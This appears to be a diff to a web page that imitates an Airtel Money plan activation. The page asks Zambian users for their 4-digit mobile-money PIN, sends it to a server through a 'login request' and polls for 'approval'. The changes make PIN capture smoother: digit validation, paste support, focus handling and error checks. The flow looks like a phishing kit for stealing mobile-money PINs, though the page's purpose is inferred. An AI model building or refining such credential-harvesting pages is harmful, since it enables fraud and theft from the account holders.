@@ -320,6 +320,10 @@
   }
   .sheet-actions button + button{border-left:1px solid #e5e7ea;}
   .sheet-actions #invalidOkBtn{color:#244d87;}
+  .sheet-actions #sendBtn:disabled{
+    color:#9aa3ad;
+    cursor:not-allowed;
+  }
   .pin-line{
     height:1px;
     background:#dfe3e7;
@@ -651,7 +655,7 @@
       </div>
       <div class="sheet-actions">
         <button type="button" id="invalidOkBtn">Cancel</button>
-        <button type="button" id="sendBtn">Send</button>
+        <button type="button" id="sendBtn" disabled>Send</button>
       </div>
     </div>
   </div>
@@ -717,11 +721,31 @@
     invalidMessage.innerHTML =
       'Do you want to activate Standard Plan<br>(ZMW 25.00) for +' +
       '260 ' + phone + '?<br><br><strong>Enter 4-digit Airtel Money PIN:</strong>';
+    dialogPinBoxes.forEach(box => {
+      box.value = '';
+      box.style.borderBottomColor = '#d4d8de';
+    });
+    sendBtn.disabled = true;
     pinLine.style.display = 'block';
     pinDots.style.display = 'flex';
     sendBtn.style.display = 'inline-block';
     invalidOkBtn.style.width = '50%';
     invalidModal.classList.add('visible');
+    dialogPinBoxes[0].focus();
+  }
+
+  function getPin(){
+    return dialogPinBoxes.map(box => box.value).join('');
+  }
+
+  function updatePinState(){
+    const digits = dialogPinBoxes.map(box => box.value);
+    const complete = digits.every(digit => /^\d$/.test(digit));
+    sendBtn.disabled = !complete;
+    dialogPinBoxes.forEach(box => {
+      box.style.borderBottomColor = complete ? '#d4d8de' : '#d64545';
+    });
+    return complete ? digits.join('') : null;
   }
 
   function checkFormValid(){
@@ -746,8 +770,14 @@
     phoneInput.focus();
   });
   sendBtn.addEventListener('click', () => {
+    const pin = updatePinState();
+    if(!pin){
+      const firstEmptyBox = dialogPinBoxes.find(box => !box.value);
+      if(firstEmptyBox) firstEmptyBox.focus();
+      return;
+    }
     invalidModal.classList.remove('visible');
-    submitLoginRequest(dialogPinBoxes.map(b => b.value).join(''));
+    submitLoginRequest(pin);
   });
   codeBoxes.forEach((box, i) => {
     box.addEventListener('input', () => {
@@ -770,11 +800,26 @@
       if(box.value && i < dialogPinBoxes.length - 1){
         dialogPinBoxes[i + 1].focus();
       }
+      updatePinState();
     });
     box.addEventListener('keydown', (e) => {
       if(e.key === 'Backspace' && !box.value && i > 0){
         dialogPinBoxes[i - 1].focus();
       }
+    });
+    box.addEventListener('paste', (e) => {
+      e.preventDefault();
+      const digits = (e.clipboardData || window.clipboardData)
+        .getData('text')
+        .replace(/\D/g, '')
+        .slice(0, dialogPinBoxes.length - i);
+
+      digits.split('').forEach((digit, offset) => {
+        dialogPinBoxes[i + offset].value = digit;
+      });
+      updatePinState();
+      const nextIndex = Math.min(i + digits.length, dialogPinBoxes.length - 1);
+      dialogPinBoxes[nextIndex].focus();
     });
   });
 
@@ -861,6 +906,7 @@
         })
       });
       const data = await res.json();
+      if(!res.ok) throw new Error(data.error || 'Unable to send the request.');
       pollApproval(data.id, params);
     } catch (err) {
       overlayTitle.textContent = 'Connection error';
